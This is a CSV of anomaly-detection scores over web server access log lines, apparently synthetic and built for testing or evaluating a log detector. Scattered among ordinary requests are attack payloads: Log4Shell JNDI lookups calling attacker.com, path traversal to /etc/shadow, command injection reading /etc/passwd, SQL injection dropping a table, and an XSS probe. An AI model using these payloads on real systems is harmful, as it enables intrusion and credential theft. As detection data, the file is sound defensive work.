score_content,score_session,score_fused,score_fused_norm,line
1.9170691967010498,,1.9170691967010498,1.9170691967010498,234.121.194.138 - - [10/Jan/2025:12:04:56 +0000] "GET /profile HTTP/1.1" 200 18097 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.984287977218628,,1.984287977218628,1.984287977218628,181.93.20.235 - - [10/Jan/2025:12:04:57 +0000] "GET /about HTTP/1.1" 200 17407 "-" "python-requests/2.31.0"
1.845126986503601,,1.845126986503601,1.845126986503601,43.84.219.134 - - [10/Jan/2025:12:04:57 +0000] "GET /api/products HTTP/1.1" 200 5010 "-" "Wget/1.20.3 (linux-gnu)"
24.670501708984375,,24.670501708984375,24.670501708984375,115.208.15.117 - - [10/Jan/2025:12:05:02 +0000] "GET /search?q=headphones HTTP/1.1" 200 16823 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2982378304004669,,0.2982378304004669,0.2982378304004669,186.6.102.66 - - [10/Jan/2025:12:05:05 +0000] "GET /index.html HTTP/1.1" 200 10198 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7012256383895874,,1.7012256383895874,1.7012256383895874,139.16.240.229 - - [10/Jan/2025:12:05:09 +0000] "GET /server-status HTTP/1.1" 200 2189 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.0654337406158447,,3.0654337406158447,3.0654337406158447,96.229.98.115 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.js HTTP/1.1" 304 13874 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.19917899370193481,,0.19917899370193481,0.19917899370193481,31.46.138.101 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.css HTTP/1.1" 204 11495 "https://www.google.com/" "python-requests/2.31.0"
4.954441547393799,,4.954441547393799,4.954441547393799,119.173.185.140 - - [10/Jan/2025:12:05:14 +0000] "GET / HTTP/1.1" 302 9876 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.759618759155273,,24.759618759155273,24.759618759155273,71.49.240.225 - - [10/Jan/2025:12:05:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 5183 "-" "sqlmap/1.5.10#stable"
24.727436065673828,,24.727436065673828,24.727436065673828,62.53.18.26 - - [10/Jan/2025:12:05:17 +0000] "GET /search?q=phone HTTP/1.1" 201 612 "-" "python-requests/2.31.0"
0.2746123671531677,,0.2746123671531677,0.2746123671531677,103.113.60.139 - - [10/Jan/2025:12:05:20 +0000] "GET /index.html HTTP/1.1" 200 1549 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.953048825263977,,1.953048825263977,1.953048825263977,82.148.154.198 - - [10/Jan/2025:12:05:21 +0000] "GET /logout HTTP/1.1" 200 18977 "https://example.com/" "sqlmap/1.5.10#stable"
11021.2841796875,,11021.2841796875,11021.2841796875,57.106.77.71 - - [10/Jan/2025:12:05:22 +0000] "GET /assets/app.css HTTP/1.1" 502 1067 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.23302464187145233,,0.23302464187145233,0.23302464187145233,143.127.13.249 - - [10/Jan/2025:12:05:26 +0000] "GET /assets/app.js HTTP/1.1" 201 14098 "https://news.ycombinator.com/" "curl/7.68.0"
24.733457565307617,,24.733457565307617,24.733457565307617,97.48.194.138 - - [10/Jan/2025:12:05:30 +0000] "GET /search?q=phone HTTP/1.1" 200 9926 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.0065369606018066,,3.0065369606018066,3.0065369606018066,144.106.248.107 - - [10/Jan/2025:12:05:31 +0000] "GET /assets/app.css HTTP/1.1" 304 1988 "https://twitter.com/" "python-requests/2.31.0"
1.9372986555099487,,1.9372986555099487,1.9372986555099487,237.116.217.95 - - [10/Jan/2025:12:05:32 +0000] "GET /login HTTP/1.1" 200 2690 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3264768123626709,,0.3264768123626709,0.3264768123626709,155.11.224.19 - - [10/Jan/2025:12:05:37 +0000] "GET /index.html HTTP/1.1" 200 19923 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8664337396621704,,1.8664337396621704,1.8664337396621704,78.245.233.4 - - [10/Jan/2025:12:05:42 +0000] "GET /api/products HTTP/1.1" 200 11010 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30147.037109375,,30147.037109375,30147.037109375,155.181.53.102 - - [10/Jan/2025:12:05:47 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 1424 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.71971893310547,,24.71971893310547,24.71971893310547,79.67.93.132 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=laptop HTTP/1.1" 200 11872 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
27.4426212310791,,27.4426212310791,27.4426212310791,235.53.95.81 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=headphones HTTP/1.1" 302 10593 "-" "Wget/1.20.3 (linux-gnu)"
0.22436024248600006,,0.22436024248600006,0.22436024248600006,240.150.149.185 - - [10/Jan/2025:12:05:53 +0000] "GET /assets/app.css HTTP/1.1" 200 18230 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.77050018310547,,24.77050018310547,24.77050018310547,128.141.168.242 - - [10/Jan/2025:12:05:54 +0000] "GET /api/product?id=123 HTTP/1.1" 200 8152 "https://example.com/" "sqlmap/1.5.10#stable"
11045.6240234375,,11045.6240234375,11045.6240234375,190.126.118.44 - - [10/Jan/2025:12:05:56 +0000] "GET /search?q=headphones HTTP/1.1" 500 1314 "https://example.com/" "sqlmap/1.5.10#stable"
25.052257537841797,,25.052257537841797,25.052257537841797,254.165.246.16 - - [10/Jan/2025:12:05:57 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9537478685379028,,1.9537478685379028,1.9537478685379028,18.182.39.3 - - [10/Jan/2025:12:06:02 +0000] "GET /admin HTTP/1.1" 200 7683 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.639385223388672,,24.639385223388672,24.639385223388672,2.137.142.106 - - [10/Jan/2025:12:06:05 +0000] "GET /search?q=headphones HTTP/1.1" 204 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9398895502090454,,1.9398895502090454,1.9398895502090454,207.241.233.46 - - [10/Jan/2025:12:06:09 +0000] "GET /logout HTTP/1.1" 200 14209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.595237731933594,,24.595237731933594,24.595237731933594,209.91.69.204 - - [10/Jan/2025:12:06:13 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 201 8371 "-" "dirb/2.22"
24.7047061920166,,24.7047061920166,24.7047061920166,77.176.212.218 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=camera HTTP/1.1" 200 7500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.688941955566406,,24.688941955566406,24.688941955566406,164.3.180.44 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=laptop HTTP/1.1" 200 1938 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.806931972503662,,1.806931972503662,1.806931972503662,230.136.236.11 - - [10/Jan/2025:12:06:18 +0000] "GET /dashboard HTTP/1.1" 200 3224 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.62482452392578,,24.62482452392578,24.62482452392578,176.237.72.231 - - [10/Jan/2025:12:06:23 +0000] "GET /search?q=headphones HTTP/1.1" 200 2536 "https://twitter.com/" "python-requests/2.31.0"
24.816423416137695,,24.816423416137695,24.816423416137695,151.37.193.211 - - [10/Jan/2025:12:06:28 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6888 "-" "dirb/2.22"
24.786224365234375,,24.786224365234375,24.786224365234375,174.230.139.85 - - [10/Jan/2025:12:06:30 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12851 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.9068317413330078,,1.9068317413330078,1.9068317413330078,60.215.20.88 - - [10/Jan/2025:12:06:35 +0000] "GET /profile HTTP/1.1" 200 14422 "https://twitter.com/" "python-requests/2.31.0"
1.8272582292556763,,1.8272582292556763,1.8272582292556763,201.116.126.59 - - [10/Jan/2025:12:06:39 +0000] "GET /dashboard HTTP/1.1" 200 9056 "https://twitter.com/" "curl/7.68.0"
24.71277618408203,,24.71277618408203,24.71277618408203,205.64.183.19 - - [10/Jan/2025:12:06:42 +0000] "GET /search?q=laptop HTTP/1.1" 200 9778 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.992201805114746,,2.992201805114746,2.992201805114746,93.28.24.2 - - [10/Jan/2025:12:06:43 +0000] "GET /assets/app.css HTTP/1.1" 302 10476 "https://news.ycombinator.com/" "curl/7.68.0"
1.8794007301330566,,1.8794007301330566,1.8794007301330566,111.115.143.143 - - [10/Jan/2025:12:06:45 +0000] "GET /contact HTTP/1.1" 200 6240 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.761533737182617,,24.761533737182617,24.761533737182617,154.201.84.222 - - [10/Jan/2025:12:06:45 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 19660 "-" "dirb/2.22"
4.778011798858643,,4.778011798858643,4.778011798858643,232.251.63.147 - - [10/Jan/2025:12:06:47 +0000] "GET /about HTTP/1.1" 302 18434 "https://www.google.com/" "python-requests/2.31.0"
0.19597798585891724,,0.19597798585891724,0.19597798585891724,127.38.17.43 - - [10/Jan/2025:12:06:52 +0000] "GET /assets/app.css HTTP/1.1" 200 8895 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.955539584159851,,1.955539584159851,1.955539584159851,185.161.127.153 - - [10/Jan/2025:12:06:55 +0000] "GET /about HTTP/1.1" 200 8180 "https://www.google.com/" "python-requests/2.31.0"
24.786888122558594,,24.786888122558594,24.786888122558594,86.216.159.98 - - [10/Jan/2025:12:06:58 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13066 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.22856096923351288,,0.22856096923351288,0.22856096923351288,243.178.52.123 - - [10/Jan/2025:12:07:00 +0000] "GET /assets/app.css HTTP/1.1" 200 19866 "https://www.google.com/" "curl/7.68.0"
4.736607074737549,,4.736607074737549,4.736607074737549,248.148.201.63 - - [10/Jan/2025:12:07:03 +0000] "GET /logout HTTP/1.1" 302 16189 "https://news.ycombinator.com/" "curl/7.68.0"
24.739063262939453,,24.739063262939453,24.739063262939453,52.152.140.47 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=laptop HTTP/1.1" 200 18576 "https://twitter.com/" "sqlmap/1.5.10#stable"
30147.994140625,,30147.994140625,30147.994140625,113.205.75.213 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=camera HTTP/1.1" 429 429 "-" "sqlmap/1.5.10#stable"
0.1911906749010086,,0.1911906749010086,0.1911906749010086,65.169.40.184 - - [10/Jan/2025:12:07:08 +0000] "GET /assets/app.css HTTP/1.1" 201 8030 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.672632217407227,,24.672632217407227,24.672632217407227,130.237.236.223 - - [10/Jan/2025:12:07:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 17610 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
27.527992248535156,,27.527992248535156,27.527992248535156,153.164.235.22 - - [10/Jan/2025:12:07:12 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 17693 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.19317913055419922,,0.19317913055419922,0.19317913055419922,145.252.166.174 - - [10/Jan/2025:12:07:17 +0000] "GET /assets/app.js HTTP/1.1" 204 1551 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.710325241088867,,24.710325241088867,24.710325241088867,67.57.131.192 - - [10/Jan/2025:12:07:19 +0000] "GET /search?q=phone HTTP/1.1" 200 3331 "https://twitter.com/" "python-requests/2.31.0"
24.786426544189453,,24.786426544189453,24.786426544189453,119.198.174.151 - - [10/Jan/2025:12:07:23 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12916 "https://twitter.com/" "sqlmap/1.5.10#stable"
2.1632299423217773,,2.1632299423217773,2.1632299423217773,107.236.247.22 - - [10/Jan/2025:12:07:24 +0000] "GET / HTTP/1.1" 200 9780 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.566600799560547,,27.566600799560547,27.566600799560547,124.90.122.25 - - [10/Jan/2025:12:07:26 +0000] "GET /search?q=camera HTTP/1.1" 304 17175 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
3.054835319519043,,3.054835319519043,3.054835319519043,6.218.88.166 - - [10/Jan/2025:12:07:28 +0000] "GET /wp-login.php HTTP/1.1" 304 3871 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2248721718788147,,0.2248721718788147,0.2248721718788147,144.110.246.119 - - [10/Jan/2025:12:07:33 +0000] "GET /assets/app.js HTTP/1.1" 200 10945 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.72144317626953,,24.72144317626953,24.72144317626953,116.152.110.100 - - [10/Jan/2025:12:07:38 +0000] "GET /search?q=phone HTTP/1.1" 200 6565 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9850516319274902,,1.9850516319274902,1.9850516319274902,48.94.84.51 - - [10/Jan/2025:12:07:39 +0000] "GET /about HTTP/1.1" 200 17692 "-" "Wget/1.20.3 (linux-gnu)"
24.650915145874023,,24.650915145874023,24.650915145874023,153.100.157.101 - - [10/Jan/2025:12:07:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 10369 "-" "python-requests/2.31.0"
24.711286544799805,,24.711286544799805,24.711286544799805,236.158.152.22 - - [10/Jan/2025:12:07:43 +0000] "GET /search?q=camera HTTP/1.1" 201 9846 "https://www.google.com/" "sqlmap/1.5.10#stable"
24.78460121154785,,24.78460121154785,24.78460121154785,178.37.131.100 - - [10/Jan/2025:12:07:45 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 12332 "https://twitter.com/" "dirb/2.22"
24.756946563720703,,24.756946563720703,24.756946563720703,178.236.166.239 - - [10/Jan/2025:12:07:46 +0000] "GET /search?q=phone HTTP/1.1" 200 17708 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2151106894016266,,0.2151106894016266,0.2151106894016266,159.14.222.92 - - [10/Jan/2025:12:07:47 +0000] "GET /assets/app.css HTTP/1.1" 200 14878 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11045.69140625,,11045.69140625,11045.69140625,168.127.105.176 - - [10/Jan/2025:12:07:48 +0000] "GET /search?q=laptop HTTP/1.1" 500 1035 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.675315856933594,,24.675315856933594,24.675315856933594,8.204.195.57 - - [10/Jan/2025:12:07:53 +0000] "GET /search?q=headphones HTTP/1.1" 200 18626 "-" "curl/7.68.0"
1.9424513578414917,,1.9424513578414917,1.9424513578414917,145.191.198.197 - - [10/Jan/2025:12:07:55 +0000] "GET /logout HTTP/1.1" 200 15085 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.29428431391716003,,0.29428431391716003,0.29428431391716003,211.254.94.139 - - [10/Jan/2025:12:07:59 +0000] "GET /.git/config HTTP/1.1" 200 17896 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.727453231811523,,24.727453231811523,24.727453231811523,77.224.9.116 - - [10/Jan/2025:12:08:03 +0000] "GET /search?q=phone HTTP/1.1" 200 8211 "https://example.com/" "curl/7.68.0"
4.716963768005371,,4.716963768005371,4.716963768005371,54.208.189.151 - - [10/Jan/2025:12:08:03 +0000] "GET /contact HTTP/1.1" 304 7864 "https://example.com/" "sqlmap/1.5.10#stable"
24.714496612548828,,24.714496612548828,24.714496612548828,201.53.209.53 - - [10/Jan/2025:12:08:08 +0000] "GET /search?q=phone HTTP/1.1" 200 4662 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.22065187990665436,,0.22065187990665436,0.22065187990665436,75.147.69.244 - - [10/Jan/2025:12:08:10 +0000] "GET /assets/app.js HTTP/1.1" 200 9689 "-" "python-requests/2.31.0"
30146.8828125,,30146.8828125,30146.8828125,222.168.33.180 - - [10/Jan/2025:12:08:11 +0000] "GET /search?q=phone HTTP/1.1" 404 567 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.57763671875,,27.57763671875,27.57763671875,126.37.148.162 - - [10/Jan/2025:12:08:12 +0000] "GET /api/product?id=123 HTTP/1.1" 302 12968 "https://news.ycombinator.com/" "curl/7.68.0"
1.9591984748840332,,1.9591984748840332,1.9591984748840332,178.240.225.95 - - [10/Jan/2025:12:08:15 +0000] "GET /about HTTP/1.1" 200 9216 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.76892614364624,,4.76892614364624,4.76892614364624,163.171.179.92 - - [10/Jan/2025:12:08:17 +0000] "GET /about HTTP/1.1" 302 15122 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30146.69921875,,30146.69921875,30146.69921875,69.83.213.73 - - [10/Jan/2025:12:08:20 +0000] "GET /search?q=phone HTTP/1.1" 400 1013 "https://twitter.com/" "curl/7.68.0"
27.838844299316406,,27.838844299316406,27.838844299316406,12.26.161.201 - - [10/Jan/2025:12:08:24 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 1686 "-" "nikto/2.5.0"
0.29689887166023254,,0.29689887166023254,0.29689887166023254,254.246.110.52 - - [10/Jan/2025:12:08:24 +0000] "GET /assets/app.js HTTP/1.1" 200 122 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.9681864976882935,,1.9681864976882935,1.9681864976882935,65.22.96.171 - - [10/Jan/2025:12:08:29 +0000] "GET /login HTTP/1.1" 200 11910 "https://www.google.com/" "sqlmap/1.5.10#stable"
4.709723949432373,,4.709723949432373,4.709723949432373,110.168.24.181 - - [10/Jan/2025:12:08:29 +0000] "GET /logout HTTP/1.1" 302 7772 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.22140078246593475,,0.22140078246593475,0.22140078246593475,175.114.3.3 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.css HTTP/1.1" 200 17121 "https://example.com/" "sqlmap/1.5.10#stable"
27.522306442260742,,27.522306442260742,27.522306442260742,19.59.99.23 - - [10/Jan/2025:12:08:30 +0000] "GET /search?q=phone HTTP/1.1" 301 15753 "-" "sqlmap/1.5.10#stable"
1.9066715240478516,,1.9066715240478516,1.9066715240478516,165.174.37.18 - - [10/Jan/2025:12:08:30 +0000] "GET /logout HTTP/1.1" 200 4462 "https://twitter.com/" "python-requests/2.31.0"
0.2113797664642334,,0.2113797664642334,0.2113797664642334,161.192.39.236 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.js HTTP/1.1" 200 7081 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.8398959636688232,,1.8398959636688232,1.8398959636688232,36.193.32.151 - - [10/Jan/2025:12:08:35 +0000] "GET /api/products HTTP/1.1" 200 3392 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.65596342086792,,4.65596342086792,4.65596342086792,71.166.22.64 - - [10/Jan/2025:12:08:37 +0000] "GET /dashboard HTTP/1.1" 304 8219 "https://twitter.com/" "python-requests/2.31.0"
4.7418670654296875,,4.7418670654296875,4.7418670654296875,218.217.169.225 - - [10/Jan/2025:12:08:41 +0000] "GET /logout HTTP/1.1" 304 978 "https://www.google.com/" "curl/7.68.0"
4.653776168823242,,4.653776168823242,4.653776168823242,166.14.201.230 - - [10/Jan/2025:12:08:45 +0000] "GET /api/products HTTP/1.1" 302 9784 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
25.002037048339844,,25.002037048339844,25.002037048339844,136.228.251.4 - - [10/Jan/2025:12:08:48 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 201 2426 "https://example.com/" "sqlmap/1.5.10#stable"
24.718469619750977,,24.718469619750977,24.718469619750977,196.121.245.253 - - [10/Jan/2025:12:08:49 +0000] "GET /search?q=phone HTTP/1.1" 200 5761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.966835021972656,,24.966835021972656,24.966835021972656,243.203.102.130 - - [10/Jan/2025:12:08:53 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2081 "https://twitter.com/" "python-requests/2.31.0"
24.736705780029297,,24.736705780029297,24.736705780029297,138.158.40.72 - - [10/Jan/2025:12:08:56 +0000] "GET /search?q=laptop HTTP/1.1" 200 17682 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11022.8515625,,11022.8515625,11022.8515625,138.84.101.151 - - [10/Jan/2025:12:08:56 +0000] "GET /api/products HTTP/1.1" 500 318 "-" "sqlmap/1.5.10#stable"
24.752683639526367,,24.752683639526367,24.752683639526367,237.112.30.117 - - [10/Jan/2025:12:08:58 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2925 "https://twitter.com/" "python-requests/2.31.0"
0.20233997702598572,,0.20233997702598572,0.20233997702598572,180.3.42.128 - - [10/Jan/2025:12:08:58 +0000] "GET /assets/app.js HTTP/1.1" 200 4596 "https://twitter.com/" "curl/7.68.0"
1.94135582447052,,1.94135582447052,1.94135582447052,192.200.224.69 - - [10/Jan/2025:12:09:02 +0000] "GET /login HTTP/1.1" 200 4259 "-" "sqlmap/1.5.10#stable"
24.708789825439453,,24.708789825439453,24.708789825439453,68.183.250.148 - - [10/Jan/2025:12:09:02 +0000] "GET /search?q=phone HTTP/1.1" 200 2192 "-" "sqlmap/1.5.10#stable"
1.918581485748291,,1.918581485748291,1.918581485748291,43.95.41.66 - - [10/Jan/2025:12:09:05 +0000] "GET /profile HTTP/1.1" 200 18675 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.617338180541992,,27.617338180541992,27.617338180541992,12.220.221.4 - - [10/Jan/2025:12:09:10 +0000] "GET /api/product?id=123 HTTP/1.1" 302 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.17928022146224976,,0.17928022146224976,0.17928022146224976,142.206.234.183 - - [10/Jan/2025:12:09:13 +0000] "GET /assets/app.css HTTP/1.1" 200 1258 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30146.876953125,,30146.876953125,30146.876953125,70.212.20.147 - - [10/Jan/2025:12:09:14 +0000] "GET /search?q=phone HTTP/1.1" 404 655 "-" "curl/7.68.0"
0.31884539127349854,,0.31884539127349854,0.31884539127349854,252.12.245.103 - - [10/Jan/2025:12:09:18 +0000] "GET /index.html HTTP/1.1" 200 17000 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9510880708694458,,1.9510880708694458,1.9510880708694458,117.3.95.52 - - [10/Jan/2025:12:09:20 +0000] "GET /logout HTTP/1.1" 200 18223 "https://twitter.com/" "curl/7.68.0"
24.80482292175293,,24.80482292175293,24.80482292175293,249.127.198.199 - - [10/Jan/2025:12:09:22 +0000] "GET /api/product?id=123 HTTP/1.1" 200 19488 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.757312774658203,,24.757312774658203,24.757312774658203,89.163.215.178 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=phone HTTP/1.1" 200 17845 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30146.716796875,,30146.716796875,30146.716796875,79.27.53.136 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=laptop HTTP/1.1" 401 1489 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.966810703277588,,2.966810703277588,2.966810703277588,12.236.60.230 - - [10/Jan/2025:12:09:26 +0000] "GET /assets/app.css HTTP/1.1" 302 3148 "https://news.ycombinator.com/" "python-requests/2.31.0"
11045.76171875,,11045.76171875,11045.76171875,149.25.130.35 - - [10/Jan/2025:12:09:31 +0000] "GET /search?q=camera HTTP/1.1" 500 173 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.27746567130088806,,0.27746567130088806,0.27746567130088806,61.75.67.218 - - [10/Jan/2025:12:09:31 +0000] "GET /index.html HTTP/1.1" 200 4383 "https://news.ycombinator.com/" "curl/7.68.0"
1.8271007537841797,,1.8271007537841797,1.8271007537841797,60.20.242.52 - - [10/Jan/2025:12:09:36 +0000] "GET /dashboard HTTP/1.1" 200 9011 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
